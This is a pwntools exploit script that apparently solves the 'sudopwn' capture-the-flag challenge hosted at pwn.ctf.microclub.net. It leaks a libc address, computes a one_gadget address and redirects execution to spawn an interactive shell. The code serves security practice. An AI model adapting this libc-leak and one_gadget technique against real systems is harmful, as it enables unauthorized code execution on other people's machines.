#!/usr/bin/env python3

from pwn import *

exe = ELF("./sudopwn")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['st']

one_gadget_offset = 0x10a41c

def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote("pwn.ctf.microclub.net", 5004)

def main():
    r = conn()

    log.info('Leaking libc address ...')
    r.sendline('3')
    r.recvuntil('------+-------+------\n')
    numbers = r.recvline().decode("utf-8")
    libc__vdso_getcpu = (int(numbers.split(' ')[0]) << 32) + (int(numbers.split(' ')[1]) & 0xffffffff)
    log.info(f'Libc__vdso_getcpu address : {hex(libc__vdso_getcpu)}')
    libc.address = libc__vdso_getcpu - next(libc.search(b"__vdso_getcpu"))
    log.info(f'Libc base address : {hex(libc.address)}')
    one_gadget = libc.address + one_gadget_offset
    log.info(f'Libc one gadget : {hex(one_gadget)}')
    r.sendline('1\n9\n5')
    r.sendline(str(one_gadget & 0xffffffff))
    r.sendline('5')

    r.interactive()


if __name__ == "__main__":
    main()
